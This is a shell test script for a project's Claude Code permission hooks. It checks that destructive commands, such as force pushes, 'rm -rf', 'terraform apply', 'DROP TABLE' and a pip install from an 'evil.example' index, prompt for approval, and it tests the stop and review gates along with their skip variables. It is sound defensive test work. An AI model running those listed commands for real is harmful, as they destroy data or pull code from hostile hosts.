#!/usr/bin/env bash
# Fixture tests for the hooks in this directory: feed canned hook JSON, assert the decision.
# Run after ANY change to .claude/hooks/ or .claude/settings.json:  .claude/hooks/test-hooks.sh
# Ported from valuedocs-data-platform on 2026-09-26 with the publishing cases (release tag,
# registry push, Gradle publish) added. cistern runs the same file with Maven cases.
set -uo pipefail
here=$(cd "$(dirname "$0")" && pwd)
fail=0; n=0

guard() { # $1 = command, $2 = cwd (optional) -> prints "ask" or "pass"
  local out
  out=$(jq -n --arg c "$1" --arg d "${2:-$PWD}" '{tool_input:{command:$c}, cwd:$d}' | "$here/guard-destructive.sh")
  [ "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$out" 2>/dev/null)" = "ask" ] && echo ask || echo pass
}
expect() { # $1 = expected, $2 = actual, $3 = label
  n=$((n+1)); if [ "$1" != "$2" ]; then echo "FAIL: expected $1, got $2 — $3"; fail=1; fi
}

# A scratch repo on a feature branch, so "push while on main" depends only on the command.
tmp=$(mktemp -d); trap 'rm -rf "$tmp"' EXIT
git -C "$tmp" init -q -b feature 2>/dev/null || { git -C "$tmp" init -q && git -C "$tmp" checkout -q -b feature; }
git -C "$tmp" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init

while IFS='|' read -r want cmd; do
  [ -z "$want" ] || [ "${want:0:1}" = "#" ] && continue
  expect "$want" "$(guard "$cmd" "$tmp")" "$cmd"
done <<'CASES'
ask|git push --force origin feat
ask|git -C . push -f origin feat
ask|git push origin +feat
ask|git push --force-with-lease=feat:abc origin feat
ask|git push origin main
ask|git push origin HEAD:main
ask|git push origin --delete feat
ask|git push --tags
ask|cd x && git reset --hard origin/main
ask|git clean -fd
ask|git checkout -- .
ask|rm -rf build
ask|rm -fr /tmp/x
ask|rm -r /tmp/x
ask|rm -r -f /tmp/x
ask|rm -R dir
ask|rm --recursive dir
ask|terraform -chdir=infra apply
ask|terraform apply -auto-approve
ask|terraform -chdir=infra state rm x
ask|gcloud run jobs execute foo
ask|/usr/bin/gcloud projects list
ask|env gcloud sql instances list
ask|bq rm -t ds.t
ask|gsutil rm gs://b/o
ask|psql -c "select 1"
ask|echo "DROP TABLE judgments;" | something
ask|./gradlew bootRun
ask|./gradlew --no-daemon bootRun --args=--server.port=9090
ask|gradle bootRun
ask|./gradlew publish
ask|./gradlew flywayClean
ask|docker push ghcr.io/enrichmeai/penstock:0.3.0
ask|docker buildx build --platform linux/amd64,linux/arm64 --push -t x .
ask|git push origin v0.3.0
ask|git push origin refs/tags/v0.3.0
ask|gh workflow run deploy.yml
ask|gh release create v1
ask|gh api -X DELETE repos/x/y/git/refs/heads/z
ask|gh api repos/x/y/issues --method POST -f t=x
ask|pip install -e git+https://example.com/x.git#egg=x
ask|pip install --index-url https://evil.example/simple x
pass|git push -u origin claude/autonomous-build-workflow-2hjbcx
pass|git push
pass|git push origin feature-main-thing
pass|git status
pass|git checkout -b feat origin/main
pass|./gradlew --no-daemon build
pass|./gradlew compileTestJava
pass|./gradlew test --tests com.example.agent.tools.FileToolsTest
pass|gradle test
pass|DOCKER_BUILDKIT=1 docker build -t penstock:dev .
pass|docker compose up --build
pass|git push origin claude/v2-notes
pass|rm build/tmp.txt
pass|rm -f build/tmp.txt
pass|terraform plan
pass|gh pr view 12
pass|gh api repos/x/y/pulls
pass|npm run lint
pass|grep -rn "terraform" docs
CASES

# Bare `git push` while the current branch IS main.
git -C "$tmp" checkout -q -b main 2>/dev/null || git -C "$tmp" checkout -q main
expect ask "$(guard 'git push' "$tmp")" 'git push (on main)'
expect ask "$(guard 'git push origin' "$tmp")" 'git push origin (on main)'

# post-edit-check: exit 2 on broken JSON/Python, 0 on good, 0 for files outside its scope.
pe() { jq -n --arg f "$1" '{tool_input:{file_path:$f}}' | CLAUDE_PROJECT_DIR="$tmp" "$here/post-edit-check.sh" >/dev/null 2>&1; echo $?; }
printf '{"a":1}' > "$tmp/good.json"; printf '{"a":' > "$tmp/bad.json"
printf 'x = 1\n' > "$tmp/good.py"; printf 'def f(:\n' > "$tmp/bad.py"
mkdir -p "$tmp/dir with space"; printf '{"a":' > "$tmp/dir with space/bad.json"
expect 0 "$(pe "$tmp/good.json")" 'post-edit good.json'
expect 2 "$(pe "$tmp/bad.json")" 'post-edit bad.json'
expect 0 "$(pe "$tmp/good.py")" 'post-edit good.py'
expect 2 "$(pe "$tmp/bad.py")" 'post-edit bad.py'
expect 2 "$(pe "$tmp/dir with space/bad.json")" 'post-edit path with spaces'
printf 'echo ok\n' > "$tmp/good.sh"; printf 'if then\n' > "$tmp/bad.sh"
expect 0 "$(pe "$tmp/good.sh")" 'post-edit good.sh'
expect 2 "$(pe "$tmp/bad.sh")" 'post-edit bad.sh'
expect 0 "$(pe "$tmp/missing.json")" 'post-edit deleted file'
expect 0 "$(pe "")" 'post-edit no file_path'

# stop-fast-gates: no origin/main and nothing to check -> allow the stop silently.
out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh")); rc=$?
expect "0:" "$rc:$out" 'stop hook with nothing to check'

# stop-fast-gates: a Flyway migration without its sibling blocks; with the sibling it passes.
m="$tmp/src/main/resources/db/migration"; mkdir -p "$m/sqlite" "$m/postgres"
printf 'select 1;\n' > "$m/sqlite/V9__x.sql"
out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh"))
expect block "$(jq -r '.decision // "none"' <<<"$out")" 'stop hook: sqlite migration without a postgres sibling'
printf 'select 1;\n' > "$m/postgres/V9__x.sql"
out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh"))
expect none "$([ -z "$out" ] && echo none || jq -r '.decision // "none"' <<<"$out")" 'stop hook: migration with both siblings'
rm -rf "$tmp/src" "$(git -C "$tmp" rev-parse --git-dir)/claude-stop-check.stamp"


# guard-task (issue #78): a background agent is denied; a foreground reviewer leaves a pending
# marker that the stop hook honours until clear-review removes it when the reviewer returns.
gt() { jq -n --argjson bg "$1" --arg s "$2" '{tool_name:"Task", tool_input:{subagent_type:$s, run_in_background:$bg}}' | CLAUDE_PROJECT_DIR="$tmp" "$here/guard-task.sh" 2>/dev/null; }
gdec() { local o; o=$(cat); if [ -z "$o" ]; then echo allow; else jq -r '.hookSpecificOutput.permissionDecision // "allow"' <<<"$o" 2>/dev/null || echo error; fi; }
marker="$(git -C "$tmp" rev-parse --absolute-git-dir)/claude-review.pending"
rm -f "$marker"
expect deny "$(gt true reviewer | gdec)" 'guard-task: background reviewer denied'
expect deny "$(gt true general-purpose | gdec)" 'guard-task: background agent of any kind denied'
expect no "$([ -f "$marker" ] && echo yes || echo no)" 'guard-task: a denied call leaves no marker'
expect allow "$(gt false general-purpose | gdec)" 'guard-task: foreground non-reviewer allowed'
expect no "$([ -f "$marker" ] && echo yes || echo no)" 'guard-task: non-reviewer leaves no marker'
expect allow "$(gt false reviewer | gdec)" 'guard-task: foreground reviewer allowed'
expect yes "$([ -f "$marker" ] && echo yes || echo no)" 'guard-task: foreground reviewer writes the pending marker'
expect allow "$(jq -n '{tool_name:"Bash", tool_input:{command:"ls"}}' | CLAUDE_PROJECT_DIR="$tmp" "$here/guard-task.sh" 2>/dev/null | gdec)" 'guard-task: non-Task input ignored'

# stop-fast-gates with a pending review: block once, then allow with a warning and clear the marker.
out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh"))
expect block "$(jq -r '.decision // "none"' <<<"$out" 2>/dev/null || echo error)" 'stop hook: pending review blocks the stop'
expect yes "$([ -f "$marker" ] && echo yes || echo no)" 'stop hook: marker kept after the blocked stop'
out=$(echo '{"stop_hook_active":true}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh"))
expect none "$(jq -r '.decision // "none"' <<<"$out" 2>/dev/null || echo error)" 'stop hook: second stop allowed'
expect yes "$(jq -r 'if .systemMessage then "yes" else "no" end' <<<"$out" 2>/dev/null || echo error)" 'stop hook: second stop carries a warning'
expect no "$([ -f "$marker" ] && echo yes || echo no)" 'stop hook: marker cleared after the allowed stop'

# clear-review: the reviewer returning (PostToolUse Task) removes the marker; another agent does not.
gt false reviewer >/dev/null
jq -n '{tool_name:"Task", tool_input:{subagent_type:"general-purpose"}}' | CLAUDE_PROJECT_DIR="$tmp" "$here/clear-review.sh" >/dev/null 2>&1
expect yes "$([ -f "$marker" ] && echo yes || echo no)" 'clear-review: another agent returning leaves the marker'
jq -n '{tool_name:"Task", tool_input:{subagent_type:"reviewer"}}' | CLAUDE_PROJECT_DIR="$tmp" "$here/clear-review.sh" >/dev/null 2>&1
expect no "$([ -f "$marker" ] && echo yes || echo no)" 'clear-review: reviewer returning removes the marker'
out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh"))
expect "" "$out" 'stop hook: nothing pending after the reviewer returned'

# CLAUDE_SKIP_STOP_COMPILE=1 is the narrower opt-out: it never skips the review gate.
gt false reviewer >/dev/null
out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_SKIP_STOP_COMPILE=1 CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh"))
expect block "$(jq -r '.decision // "none"' <<<"$out" 2>/dev/null || echo error)" 'stop hook: CLAUDE_SKIP_STOP_COMPILE=1 does not skip the review gate'
rm -f "$marker"

# CLAUDE_SKIP_STOP_GATES=1 skips the review gate like the others.
gt false reviewer >/dev/null
out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_SKIP_STOP_GATES=1 CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh"))
expect "" "$out" 'stop hook: CLAUDE_SKIP_STOP_GATES=1 skips the review gate'
rm -f "$marker"

echo "hook tests: $n run, $([ $fail = 0 ] && echo 'all passed' || echo 'FAILURES above')"
exit $fail
